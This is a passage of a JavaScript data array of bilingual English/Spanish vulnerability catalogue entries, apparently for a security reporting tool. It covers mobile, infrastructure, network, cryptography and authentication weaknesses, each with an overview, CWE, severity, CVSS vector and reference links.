        cvss: { score: 5.3, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "N", availability: "N" },
        references: ["https://owasp.org/www-project-mobile-top-10/2024-list/2024-M7-Inadequate_Privacy_Controls"],
        tags: ["Mobile"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-mob-007",
        title_en: "Insufficient Binary Protections",
        title_es: "Protecciones de Binario Insuficientes",
        overview_en: "### Overview\nThe lack of protections against reverse engineering and tampering. This makes it easier for an attacker to analyze the application's code, find vulnerabilities, or create a malicious version of the app.",
        overview_es: "### Resumen\nLa falta de protecciones contra la ingeniería inversa y la manipulación. Esto facilita que un atacante analice el código de la aplicación, encuentre vulnerabilidades o cree una versión maliciosa de la aplicación.",
        cwe: "CWE-657",
        severity: "Medium",
        cvss: { score: 4.6, vectorString: "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N", attackVector: "L", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "L", integrity: "L", availability: "N" },
        references: ["https://owasp.org/www-project-mobile-top-10/2024-list/2024-M8-Insufficient_Binary_Protections"],
        tags: ["Mobile"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-mob-008",
        title_en: "Security Misconfiguration",
        title_es: "Configuración de Seguridad Incorrecta",
        overview_en: "### Overview\nThis includes insecure default settings, misconfigured permissions for files and services, or exposing sensitive information in configuration files. It's the mobile-specific version of the general misconfiguration vulnerability.",
        overview_es: "### Resumen\nEsto incluye configuraciones predeterminadas inseguras, permisos mal configurados para archivos y servicios, o la exposición de información sensible en archivos de configuración. Es la versión específica para móviles de la vulnerabilidad general de configuración incorrecta.",
        cwe: "CWE-16",
        severity: "Medium",
        cvss: { score: 5.3, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "N", availability: "N" },
        references: ["https://owasp.org/www-project-mobile-top-10/2024-list/2024-M9-Security_Misconfiguration"],
        tags: ["Mobile", "Infrastructure"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-mob-009",
        title_en: "Insecure Data Storage",
        title_es: "Almacenamiento Inseguro de Datos",
        overview_en: "### Overview\nThis covers the insecure storage of sensitive data on the device itself. Data might be stored in insecure locations (e.g., SD card, app's private directory with incorrect permissions) or without proper encryption.",
        overview_es: "### Resumen\nEsto cubre el almacenamiento inseguro de datos sensibles en el propio dispositivo. Los datos pueden almacenarse en ubicaciones inseguras (p. ej., tarjeta SD, directorio privado de la aplicación con permisos incorrectos) o sin el cifrado adecuado.",
        cwe: "CWE-922",
        severity: "High",
        cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N", attackVector: "L", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
        references: ["https://owasp.org/www-project-mobile-top-10/2024-list/2024-M1-Insecure_Data_Storage"],
        tags: ["Mobile", "Cryptography"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-mob-010",
        title_en: "Insufficient Cryptography",
        title_es: "Criptografía Insuficiente",
        overview_en: "### Overview\nThis vulnerability occurs when an application uses weak, outdated, or improperly implemented cryptographic algorithms or protocols. This can lead to the compromise of data that is supposed to be protected.",
        overview_es: "### Resumen\nEsta vulnerabilidad ocurre cuando una aplicación utiliza algoritmos o protocolos criptográficos débiles, obsoletos o implementados incorrectamente. Esto puede llevar al compromiso de los datos que se supone que deben estar protegidos.",
        cwe: "CWE-327",
        severity: "High",
        cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
        references: ["https://owasp.org/www-project-mobile-top-10/2024-list/2024-M10-Insufficient_Cryptography"],
        tags: ["Mobile", "Cryptography"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-mob-011",
        title_en: "Hardcoded Secrets",
        title_es: "Secretos Embebidos en el Código",
        overview_en: "### Overview\nSensitive data, such as API keys, passwords, or encryption keys, are hardcoded directly into the application's source code or configuration files. This makes them easily discoverable through reverse engineering.",
        overview_es: "### Resumen\nDatos sensibles, como claves de API, contraseñas o claves de cifrado, están embebidos directamente en el código fuente de la aplicación o en archivos de configuración. Esto los hace fácilmente descubribles a través de la ingeniería inversa.",
        cwe: "CWE-798",
        severity: "High",
        cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "L", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
        references: ["https://owasp.org/www-project-mobile-top-10/2016-list/m5-insufficient-cryptography"],
        tags: ["Mobile", "Cryptography"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-mob-012",
        title_en: "Binary Tampering / Reverse Engineering",
        title_es: "Manipulación de Binario / Ingeniería Inversa",
        overview_en: "### Overview\nThe application lacks mechanisms to detect and prevent tampering with its binary or runtime behavior. Attackers can modify the app to bypass security controls, steal data, or perform other malicious actions.",
        overview_es: "### Resumen\nLa aplicación carece de mecanismos para detectar y prevenir la manipulación de su binario o su comportamiento en tiempo de ejecución. Los atacantes pueden modificar la aplicación para eludir los controles de seguridad, robar datos o realizar otras acciones maliciosas.",
        cwe: "CWE-657",
        severity: "Medium",
        cvss: { score: 6.3, vectorString: "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L", attackVector: "L", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "L", integrity: "L", availability: "L" },
        references: ["https://mobsf.github.io/docs/#/"],
        tags: ["Mobile"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-mob-013",
        title_en: "Insecure Code",
        title_es: "Código Inseguro",
        overview_en: "### Overview\nGeneral insecure coding practices that lead to vulnerabilities. This can include issues like buffer overflows, race conditions, or unsafe handling of data within the mobile application code itself.",
        overview_es: "### Resumen\nPrácticas generales de codificación insegura que conducen a vulnerabilidades. Esto puede incluir problemas como desbordamientos de búfer, condiciones de carrera o manejo inseguro de datos dentro del propio código de la aplicación móvil.",
        cwe: "CWE-676",
        severity: "Medium",
        cvss: { score: 5.5, vectorString: "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L", attackVector: "L", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "L", availability: "L" },
        references: ["https://developer.android.com/topic/security/best-practices"],
        tags: ["Mobile"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-mob-014",
        title_en: "Improper Session Handling",
        title_es: "Manejo Inadecuado de Sesiones",
        overview_en: "### Overview\nFlaws in how the application manages session tokens, such as non-expiring tokens, predictable tokens, or insecure transmission, can allow an attacker to hijack a legitimate user's session.",
        overview_es: "### Resumen\nLas fallas en cómo la aplicación gestiona los tokens de sesión, como tokens que no expiran, tokens predecibles o transmisión insegura, pueden permitir que un atacante secuestre la sesión de un usuario legítimo.",
        cwe: "CWE-384",
        severity: "High",
        cvss: { score: 8.1, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "H", integrity: "H", availability: "N" },
        references: ["https://owasp.org/www-project-mobile-top-10/2016-list/m4-insecure-authentication"],
        tags: ["Mobile", "Authentication"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-mob-015",
        title_en: "Use of Insecure Platform APIs",
        title_es: "Uso de APIs de Plataforma Inseguras",
        overview_en: "### Overview\nThe application uses deprecated or known insecure APIs provided by the mobile operating system (iOS or Android). This can expose the app to known vulnerabilities that have been addressed in newer, more secure APIs.",
        overview_es: "### Resumen\nLa aplicación utiliza APIs obsoletas o conocidas como inseguras proporcionadas por el sistema operativo móvil (iOS o Android). Esto puede exponer la aplicación a vulnerabilidades conocidas que han sido abordadas en APIs más nuevas y seguras.",
        cwe: "CWE-676",
        severity: "Medium",
        cvss: { score: 5.5, vectorString: "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L", attackVector: "L", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "L", availability: "L" },
        references: ["https://developer.android.com/topic/security/best-practices"],
        tags: ["Mobile"],
        ...emptyVulnBoilerplate
    },
    // --- INFRASTRUCTURE VULNERABILITIES ---
    {
        id: "vuln-inf-001",
        title_en: "Unnecessary Port Exposure",
        title_es: "Exposición de Puertos Innecesarios",
        overview_en: "### Overview\nServices are exposed to the internet or internal networks on ports that are not required for the application's functionality. This increases the attack surface and exposes potentially vulnerable services.",
        overview_es: "### Resumen\nLos servicios se exponen a Internet o a redes internas en puertos que no son necesarios para la funcionalidad de la aplicación. Esto aumenta la superficie de ataque y expone servicios potencialmente vulnerables.",
        cwe: "CWE-1008",
        severity: "Medium",
        cvss: { score: 5.3, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "N", availability: "N" },
        references: ["https://www.cisa.gov/uscert/ncas/tips/ST04-010"],
        tags: ["Infrastructure", "Network"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-inf-002",
        title_en: "Vulnerable Server Software",
        title_es: "Software de Servidor Vulnerable",
        overview_en: "### Overview\nThe server is running software (e.g., web server, database, OS) with known vulnerabilities. Attackers can exploit these flaws to compromise the server.",
        overview_es: "### Resumen\nEl servidor está ejecutando software (p. ej., servidor web, base de datos, SO) con vulnerabilidades conocidas. Los atacantes pueden explotar estas fallas para comprometer el servidor.",
        cwe: "CWE-937",
        severity: "High",
        cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        references: ["https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/"],
        tags: ["Infrastructure"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-inf-003",
        title_en: "Insecure Container/Docker Configuration",
        title_es: "Configuración Insegura de Contenedores/Docker",
        overview_en: "### Overview\nContainers are misconfigured in a way that weakens their isolation from the host system or other containers. This can include running containers as root, mounting sensitive host directories, or having an insecure network configuration.",
        overview_es: "### Resumen\nLos contenedores están mal configurados de una manera que debilita su aislamiento del sistema anfitrión u otros contenedores. Esto puede incluir ejecutar contenedores como root, montar directorios sensibles del anfitrión o tener una configuración de red insegura.",
        cwe: "CWE-16",
        severity: "High",
        cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H", attackVector: "L", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "C", confidentiality: "H", integrity: "H", availability: "H" },
        references: ["https://docs.docker.com/engine/security/"],
        tags: ["Infrastructure"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-inf-004",
        title_en: "Local Privilege Escalation",
        title_es: "Escalada de Privilegios Local",
        overview_en: "### Overview\nA vulnerability that allows an attacker with low-privilege access to a system to gain higher privileges, such as root or administrator. This can be due to kernel exploits, misconfigured SUID binaries, or exploitable services running as root.",
        overview_es: "### Resumen\nUna vulnerabilidad que permite a un atacante con acceso de bajo privilegio a un sistema obtener privilegios más altos, como root o administrador. Esto puede deberse a exploits del kernel, binarios SUID mal configurados o servicios explotables que se ejecutan como root.",
        cwe: "CWE-269",
        severity: "High",
        cvss: { score: 7.8, vectorString: "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "L", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        references: ["https://attack.mitre.org/tactics/TA0004/"],
        tags: ["Infrastructure"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-inf-005",
        title_en: "Buffer Overflow in Backend Services",
        title_es: "Desbordamiento de Búfer en Servicios Backend",
        overview_en: "### Overview\nA backend service is vulnerable to a buffer overflow, where an attacker can write data beyond the allocated buffer. This can lead to denial of service, information leakage, or arbitrary code execution.",
        overview_es: "### Resumen\nUn servicio backend es vulnerable a un desbordamiento de búfer, donde un atacante puede escribir datos más allá del búfer asignado. Esto puede conducir a una denegación de servicio, fuga de información o ejecución de código arbitrario.",
        cwe: "CWE-120",
        severity: "Critical",
        cvss: { score: 9.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        references: ["https://owasp.org/www-community/vulnerabilities/Buffer_Overflow"],
        tags: ["Infrastructure"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-inf-006",
        title_en: "Weak File System Permissions",
        title_es: "Permisos Débiles en el Sistema de Archivos",
        overview_en: "### Overview\nSensitive files or directories have overly permissive access controls, allowing low-privilege users to read, modify, or execute files they should not have access to. This can lead to information disclosure or privilege escalation.",
        overview_es: "### Resumen\nLos archivos o directorios sensibles tienen controles de acceso demasiado permisivos, lo que permite a los usuarios de bajo privilegio leer, modificar o ejecutar archivos a los que no deberían tener acceso. Esto puede conducir a la divulgación de información o a la escalada de privilegios.",
        cwe: "CWE-732",
        severity: "Medium",
        cvss: { score: 6.5, vectorString: "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L", attackVector: "L", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "L", availability: "L" },
        references: ["https://cheatsheetseries.owasp.org/cheatsheets/File_System_Cheat_Sheet.html"],
        tags: ["Infrastructure"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-inf-007",
        title_en: "Weak SSH Configuration",
        title_es: "Configuración Débil de SSH",
        overview_en: "### Overview\nThe SSH service is configured with weak settings, such as allowing root login, using password authentication instead of keys, or employing weak ciphers. This makes the server more susceptible to brute-force attacks or interception.",
        overview_es: "### Resumen\nEl servicio SSH está configurado con ajustes débiles, como permitir el inicio de sesión de root, usar autenticación por contraseña en lugar de claves o emplear cifrados débiles. Esto hace que el servidor sea más susceptible a ataques de fuerza bruta o interceptación.",
        cwe: "CWE-326",
        severity: "Medium",
        cvss: { score: 6.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "L", availability: "N" },
        references: ["https://www.cisecurity.org/benchmark/ssh"],
        tags: ["Infrastructure", "Network", "Cryptography"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-inf-008",
        title_en: "Unpatched Software / Failing to Patch",
        title_es: "Software sin Parches / Falta de Aplicación de Parches",
        overview_en: "### Overview\nCritical security patches for the operating system or installed software have not been applied. This leaves the system vulnerable to a wide range of publicly known exploits.",
        overview_es: "### Resumen\nNo se han aplicado parches de seguridad críticos para el sistema operativo o el software instalado. Esto deja al sistema vulnerable a una amplia gama de exploits conocidos públicamente.",
        cwe: "CWE-1026",
        severity: "Critical",
        cvss: { score: 9.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        references: ["https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/"],
        tags: ["Infrastructure"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-inf-009",
        title_en: "Cloud Misconfiguration (e.g., Public S3 Bucket)",
        title_es: "Configuración Incorrecta de la Nube (p. ej., Bucket S3 Público)",
        overview_en: "### Overview\nCloud services (like AWS S3, Azure Blob Storage, Google Cloud Storage) are misconfigured to allow public access to sensitive data. This is a common and severe vulnerability.",
        overview_es: "### Resumen\nLos servicios en la nube (como AWS S3, Azure Blob Storage, Google Cloud Storage) están mal configurados para permitir el acceso público a datos sensibles. Esta es una vulnerabilidad común y grave.",
        cwe: "CWE-1121",
        severity: "High",
        cvss: { score: 8.6, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "C", confidentiality: "H", integrity: "N", availability: "N" },
        references: ["https://owasp.org/Top10/A05_2021-Security_Misconfiguration/"],
        tags: ["Infrastructure"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-inf-010",
        title_en: "Kubernetes Misconfiguration",
        title_es: "Configuración Incorrecta de Kubernetes",
        overview_en: "### Overview\nMisconfigurations in a Kubernetes cluster, such as allowing anonymous access to the Kubelet API, using default service account permissions, or exposing the dashboard to the internet, can lead to cluster compromise.",
        overview_es: "### Resumen\nLas configuraciones incorrectas en un clúster de Kubernetes, como permitir el acceso anónimo a la API de Kubelet, usar permisos de cuenta de servicio predeterminados o exponer el panel de control a Internet, pueden llevar al compromiso del clúster.",
        cwe: "CWE-16",
        severity: "High",
        cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        references: ["https://kubernetes.io/docs/concepts/security/"],
        tags: ["Infrastructure"],
        ...emptyVulnBoilerplate
    },
    // --- NETWORK VULNERABILITIES ---
    {
        id: "vuln-net-001",
        title_en: "Man-in-the-Middle (MITM)",
        title_es: "Man-in-the-Middle (MITM)",
        overview_en: "### Overview\nAn attacker secretly relays and possibly alters the communication between two parties who believe they are directly communicating with each other. This can lead to eavesdropping or impersonation.",
        overview_es: "### Resumen\nUn atacante retransmite en secreto y posiblemente altera la comunicación entre dos partes que creen que se están comunicando directamente entre sí. Esto puede conducir a la escucha de conversaciones o a la suplantación de identidad.",
        cwe: "CWE-295",
        severity: "High",
        cvss: { score: 8.1, vectorString: "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", attackVector: "A", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "N" },
        references: ["https://owasp.org/www-community/attacks/Man-in-the-middle_attack"],
        tags: ["Network"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-net-002",
        title_en: "Unencrypted Traffic Interception",
        title_es: "Interceptación de Tráfico no Cifrado",
        overview_en: "### Overview\nSensitive data is transmitted over the network in cleartext (e.g., HTTP, FTP). An attacker on the same network can easily capture and read this information.",
        overview_es: "### Resumen\nSe transmiten datos sensibles a través de la red en texto claro (p. ej., HTTP, FTP). Un atacante en la misma red puede capturar y leer fácilmente esta información.",
        cwe: "CWE-319",
        severity: "High",
        cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
        references: ["https://owasp.org/www-project-mobile-top-10/2016-list/m3-insecure-communication"],
        tags: ["Network", "Cryptography"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-net-003",
        title_en: "DNS Spoofing / Cache Poisoning",
        title_es: "Spoofing de DNS / Envenenamiento de Caché",
        overview_en: "### Overview\nAn attacker provides false DNS data to a resolver, causing it to redirect users to a malicious site. This can be used for phishing or to facilitate MITM attacks.",
        overview_es: "### Resumen\nUn atacante proporciona datos DNS falsos a un resolutor, haciendo que redirija a los usuarios a un sitio malicioso. Esto puede usarse para phishing o para facilitar ataques MITM.",
        cwe: "CWE-290",
        severity: "Medium",
        cvss: { score: 5.9, vectorString: "CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N", attackVector: "A", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "N", integrity: "H", availability: "N" },
        references: ["https://www.cloudflare.com/learning/dns/dns-cache-poisoning/"],
        tags: ["Network"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-net-004",
        title_en: "Weak Cipher Suites Enabled",
        title_es: "Suites de Cifrado Débiles Habilitadas",
        overview_en: "### Overview\nThe server supports weak or outdated cryptographic cipher suites (e.g., those using RC4, 3DES, or export-grade ciphers). This can allow an attacker to decrypt supposedly secure TLS/SSL traffic.",
        overview_es: "### Resumen\nEl servidor admite suites de cifrado criptográfico débiles u obsoletas (p. ej., las que usan RC4, 3DES o cifrados de grado de exportación). Esto puede permitir a un atacante descifrar el tráfico TLS/SSL supuestamente seguro.",
        cwe: "CWE-327",
        severity: "Medium",
        cvss: { score: 5.9, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
        references: ["https://www.acunetix.com/blog/web-security-zone/what-is-a-cipher-suite/"],
        tags: ["Network", "Cryptography"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-net-005",
        title_en: "ARP Poisoning / Spoofing",
        title_es: "Envenenamiento / Spoofing de ARP",
        overview_en: "### Overview\nAn attacker sends falsified ARP (Address Resolution Protocol) messages over a local area network. This results in linking an attacker's MAC address with the IP address of a legitimate computer or server on the network, allowing for traffic interception.",
        overview_es: "### Resumen\nUn atacante envía mensajes ARP (Protocolo de Resolución de Direcciones) falsificados a través de una red de área local. Esto da como resultado la vinculación de la dirección MAC de un atacante con la dirección IP de una computadora o servidor legítimo en la red, lo que permite la interceptación del tráfico.",
        cwe: "CWE-910",
        severity: "Medium",
        cvss: { score: 6.8, vectorString: "CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N", attackVector: "A", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "N" },
        references: ["https://www.veracode.com/security/arp-spoofing"],
        tags: ["Network"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-net-006",
        title_en: "Denial-of-Service (DoS)",
        title_es: "Denegación de Servicio (DoS)",
        overview_en: "### Overview\nAn attack meant to shut down a machine or network, making it inaccessible to its intended users. DoS attacks accomplish this by flooding the target with traffic or sending it information that triggers a crash.",
        overview_es: "### Resumen\nUn ataque destinado a apagar una máquina o red, haciéndola inaccesible para sus usuarios previstos. Los ataques DoS logran esto inundando el objetivo con tráfico o enviándole información que provoca una caída.",
        cwe: "CWE-400",
        severity: "High",
        cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "N", integrity: "N", availability: "H" },
        references: ["https://www.cisa.gov/uscert/ncas/tips/ST04-015"],
        tags: ["Network"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-net-007",
        title_en: "Misconfigured Firewall Rules",
        title_es: "Reglas de Firewall Mal Configuradas",
        overview_en: "### Overview\nFirewall rules are overly permissive, allowing access to services and ports that should be restricted. This can expose internal services to the internet or allow unintended lateral movement within a network.",
        overview_es: "### Resumen\nLas reglas del firewall son demasiado permisivas, lo que permite el acceso a servicios y puertos que deberían estar restringidos. Esto puede exponer servicios internos a Internet o permitir un movimiento lateral no deseado dentro de una red.",
        cwe: "CWE-653",
        severity: "Medium",
        cvss: { score: 6.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "L", availability: "L" },
        references: ["https://www.sans.org/top25-software-errors/"],
        tags: ["Network", "Infrastructure"],
        ...emptyVulnBoilerplate
    },
    // --- CRYPTOGRAPHY VULNERABILITIES ---
    {
        id: "vuln-cry-001",
        title_en: "Use of Weak Cryptographic Algorithms",
        title_es: "Uso de Algoritmos Criptográficos Débiles",
        overview_en: "### Overview\nThe application uses cryptographic algorithms that are considered weak or broken, such as MD5, SHA-1, or DES. These algorithms can be compromised by modern computing power.",
        overview_es: "### Resumen\nLa aplicación utiliza algoritmos criptográficos que se consideran débiles o rotos, como MD5, SHA-1 o DES. Estos algoritmos pueden ser comprometidos por la potencia informática moderna.",
        cwe: "CWE-327",
        severity: "High",
        cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "N" },
        references: ["https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure"],
        tags: ["Cryptography"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-cry-002",
        title_en: "Insufficient Key Length",
        title_es: "Longitud de Clave Insuficiente",
        overview_en: "### Overview\nCryptographic keys with insufficient length are used (e.g., RSA with 1024 bits). These keys are vulnerable to brute-force attacks.",
        overview_es: "### Resumen\nSe utilizan claves criptográficas con una longitud insuficiente (p. ej., RSA con 1024 bits). Estas claves son vulnerables a ataques de fuerza bruta.",
        cwe: "CWE-326",
        severity: "Medium",
        cvss: { score: 5.9, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
        references: ["https://www.keylength.com/"],
        tags: ["Cryptography"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-cry-003",
        title_en: "Padding Oracle Attack",
        title_es: "Ataque de Oráculo de Relleno (Padding Oracle)",
        overview_en: "### Overview\nA padding oracle attack is an attack which uses the server's error messages to decrypt ciphertext. It allows an attacker to decrypt encrypted data without knowing the encryption key.",
        overview_es: "### Resumen\nUn ataque de oráculo de relleno es un ataque que utiliza los mensajes de error del servidor para descifrar texto cifrado. Permite a un atacante descifrar datos cifrados sin conocer la clave de cifrado.",
        cwe: "CWE-209",
        severity: "High",
        cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
        references: ["https://owasp.org/www-community/attacks/Padding_Oracle_Attack"],
        tags: ["Cryptography"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-cry-004",
        title_en: "Weak Random Number Generation",
        title_es: "Generación Débil de Números Aleatorios",
        overview_en: "### Overview\nThe application uses a predictable or weak pseudo-random number generator (PRNG) for security-sensitive purposes like generating session tokens, CSRF tokens, or cryptographic keys.",
        overview_es: "### Resumen\nLa aplicación utiliza un generador de números pseudoaleatorios (PRNG) predecible o débil para fines sensibles a la seguridad, como la generación de tokens de sesión, tokens CSRF o claves criptográficas.",
        cwe: "CWE-338",
        severity: "Medium",
        cvss: { score: 6.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "H", availability: "N" },
        references: ["https://owasp.org/www-community/vulnerabilities/Insecure_Randomness"],
        tags: ["Cryptography"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-cry-005",
        title_en: "CBC Bit-Flipping Attack",
        title_es: "Ataque de Inversión de Bits en CBC",
        overview_en: "### Overview\nA CBC bit-flipping attack is an attack on a cryptographic system that uses Cipher Block Chaining (CBC) mode. An attacker can manipulate ciphertext blocks to introduce predictable changes in the plaintext, potentially bypassing security controls.",
        overview_es: "### Resumen\nUn ataque de inversión de bits en CBC es un ataque a un sistema criptográfico que utiliza el modo de encadenamiento de bloques de cifrado (CBC). Un atacante puede manipular bloques de texto cifrado para introducir cambios predecibles en el texto plano, eludiendo potencialmente los controles de seguridad.",
        cwe: "CWE-329",
        severity: "Medium",
        cvss: { score: 5.9, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "N", integrity: "H", availability: "N" },
        references: ["https://crypto.stackexchange.com/questions/658/what-is-a-plaintext-or-bit-flipping-attack"],
        tags: ["Cryptography"],
        ...emptyVulnBoilerplate
    },
    // --- AUTHENTICATION VULNERABILITIES ---
    {
        id: "vuln-auth-001",
        title_en: "Weak Password Policy",
        title_es: "Política de Contraseñas Débil",
        overview_en: "### Overview\nThe application does not enforce strong password complexity rules, allowing users to choose simple, easily guessable passwords. This increases the risk of brute-force or credential stuffing attacks.",
